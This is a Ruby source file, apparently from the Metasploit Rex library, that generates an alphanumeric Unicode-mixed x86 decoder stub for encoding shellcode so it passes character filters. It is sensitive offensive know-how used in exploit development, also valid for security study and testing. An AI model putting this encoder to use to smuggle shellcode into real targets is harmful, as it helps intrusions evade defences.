#!/usr/bin/env ruby
# -*- coding: binary -*-

require 'rex/encoder/alpha2/generic'

module Rex
module Encoder
module Alpha2

class UnicodeMixed < Generic

  def self.gen_second(block, base)
    # unicode uses additive encoding
    (block - base)
  end

  def self.gen_decoder_prefix(reg, offset)
    if (offset > 21)
       raise "Critical: Offset is greater than 21"
    end

    # offset untested for unicode :(
    if (offset <= 14)
      nop = 'CP' * offset
      mod = 'IA' * (14 - offset) + nop    # dec ecx,,, push ecx, pop edx
    else
      mod = 'AA' * (offset - 14)			# inc ecx
      nop = 'CP' * (14 - mod.length)
      mod += nop
    end
    regprefix = {                       # nops ignored below
      'EAX'   => 'PPYA' + mod,         # push eax, pop ecx
      'ECX'   =>  mod + "4444",        # dec ecx
      'EDX'   => 'RRYA' + mod,         # push edx, pop ecx
      'EBX'   => 'SSYA' + mod,         # push ebx, pop ecx
      'ESP'   => 'TUYA' + mod,         # push esp, pop ecx
      'EBP'   => 'UUYA' + mod,         # push ebp, pop ecx
      'ESI'   => 'VVYA' + mod,         # push esi, pop ecx
      'EDI'   => 'WWYA' + mod,         # push edi, pop edi
    }

    prefix = regprefix[reg.upcase]
    if prefix.nil?
      raise "Critical: Invalid register"
    end

    return prefix
  end

  def self.gen_decoder(reg, offset)
    decoder =
      gen_decoder_prefix(reg, offset) +
      "j" +               # push 0
      "XA" +              # pop eax, NOP
      "QA" +              # push ecx, NOP
      "DA" +              # inc esp, NOP
      "ZA" +              # pop edx, NOP
      "BA" +              # inc edx, NOP
      "RA" +              # push edx, NOP
      "LA" +              # dec esp, NOP
      "YA" +              # pop ecx, NOP
      "IA" +              # dec ecx, NOP
      "QA" +              # push ecx, NOP
      "IA" +              # dec ecx, NOP
      "QA" +              # push ecx, NOP
      "IA" +              # dec ecx, NOP
      "hAAA" +            # push 00410041, NOP
      "Z" +               # pop edx
      "1A" +              # add [ecx], dh NOP
      "IA" +              # dec ecx, NOP
      "IA" +              # dec ecx, NOP
      "J" +               # dec edx
      "1" +               # add [ecx], dh
      "1A" +              # add [ecx], dh NOP
      "IA" +              # dec ecx, NOP
      "IA" +              # dec ecx, NOP
      "BA" +              # inc edx, NOP
      "BA" +              # inc edx, NOP
      "B" +               # inc edx
      "Q" +               # add [ecx], dl
      "I" +               # dec ecx
      "1A" +              # add [ecx], dh NOP
      "I" +               # dec ecx
      "Q" +               # add [ecx], dl
      "IA" +              # dec ecx, NOP
      "I" +               # dec ecx
      "Q" +               # add [ecx], dh
      "I" +               # dec ecx
      "1" +               # add [ecx], dh
      "1" +               # add [ecx], dh
      "1A" +              # add [ecx], dh NOP
      "IA" +              # dec ecx, NOP
      "J" +               # dec edx
      "Q" +               # add [ecx], dl
      "YA" +              # pop ecx, NOP
      "Z" +               # pop edx
      "B" +               # add [edx], al
      "A" +               # inc ecx       <-------
      "B" +               # add [edx], al         |
      "A" +               # inc ecx               |
      "B" +               # add [edx], al         |
      "A" +               # inc ecx               |
      "B" +               # add [edx], al         |
      "A" +               # inc ecx               |
      "B" +               # add [edx], al         |
      "kM" +              # imul eax, [eax], 10 * |
      "A" +               # add [edx], al         |
      "G" +               # inc edi               |
      "B" +               # add [edx], al         |
      "9" +               # cmp [eax], eax        |
      "u" +               # jnz ------------------
      "4JB"

    return decoder
  end

end end end end
